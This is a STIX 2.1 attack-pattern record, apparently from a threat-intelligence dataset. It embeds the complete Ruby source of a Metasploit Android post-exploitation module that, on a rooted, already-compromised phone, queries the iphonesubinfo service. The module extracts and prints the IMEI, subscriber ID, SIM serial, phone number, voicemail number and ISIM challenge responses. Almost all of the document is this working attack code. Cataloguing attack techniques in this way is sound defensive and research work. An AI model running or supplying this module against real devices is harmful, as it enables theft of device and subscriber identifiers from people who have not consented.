{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d9c40d7-2917-497f-aa91-abc5d8b256b9",
    "created": "2024-08-14T16:33:04.622159Z",
    "modified": "2024-08-14T16:33:04.622163Z",
    "name": "extracts subscriber info from target device",
    "description": " This module displays the subscriber info stored on the target phone. It uses call service to get values of each transaction code like imei etc.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/android/gather/sub_info.rb",
            "external_id": "sub_info.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  include Msf::Post::Common\n  include Msf::Post::Android::Priv\n  include Msf::Post::Android::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'extracts subscriber info from target device',\n          'Description' => %q{\n            This module displays the subscriber info stored on the target phone.\n            It uses call service to get values of each transaction code like imei etc.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => ['Auxilus'],\n          'SessionTypes' => [ 'meterpreter', 'shell' ],\n          'Platform' => 'android'\n        }\n      )\n    )\n  end\n\n  def run\n    unless is_root?\n      print_error('This module requires root permissions.')\n      return\n    end\n\n    @transaction_codes ||= [\n      'DeviceId',\n      'DeviceIdForSubscriber',\n      'ImeiForSubscriber',\n      'DeviceSvn',\n      'SubscriberId',\n      'SubscriberIdForSubscriber',\n      'GroupIdLevel1',\n      'GroupIdLevel1ForSubscriber',\n      'IccSerialNumber',\n      'IccSerialNumberForSubscriber',\n      'Line1Number',\n      'Line1NumberForSubscriber',\n      'Line1AlphaTag',\n      'Line1AlphaTagForSubscriber',\n      'Msisdn',\n      'MsisdnForSubscriber',\n      'VoiceMailNumber',\n      'VoiceMailNumberForSubscriber',\n      'CompleteVoiceMailNumber',\n      'CompleteVoiceMailNumberForSubscriber',\n      'VoiceMailAlphaTag',\n      'VoiceMailAlphaTagForSubscriber',\n      'IsimImpi',\n      'IsimDomain',\n      'IsimImpu',\n      'IsimIst',\n      'IsimPcscf',\n      'IsimChallengeResponse',\n      'IccSimChallengeResponse'\n    ]\n    values ||= []\n    arr ||= []\n    for code in 1..@transaction_codes.length do\n      print_status(\"using code : #{code}\")\n      cmd = \"service call iphonesubinfo #{code}\"\n      block = cmd_exec(cmd)\n      value, tc = get_val(block, code)\n      arr << [tc, value]\n    end\n\n    tc_tbl = Rex::Text::Table.new(\n      'Header' => 'Subscriber info',\n      'Indent' => 1,\n      'Columns' => ['transaction code', 'value']\n    )\n\n    arr.each do |a|\n      tc_tbl << [\n        a[0],     #  TRANSACTION CODE\n        a[1]      #  value\n      ]\n    end\n    print_line(tc_tbl.to_s)\n  end\n\n  def get_val(data, code)\n    parsed = data.gsub(/Parcel/, '')\n    string = ''\n    100.times do |i|\n      next if i % 2 == 0\n\n      str = parsed.split(\"'\")[i]\n      break if str.nil?\n\n      string += str\n    end\n    v = ''\n    string.split('.').each do |chr|\n      next if chr.nil? || (chr == \"\\n\")\n\n      v += chr\n    end\n    return v, @transaction_codes[code - 1]\n  end\nend\n",
    "x_mitre_platforms": [
        "android"
    ]
}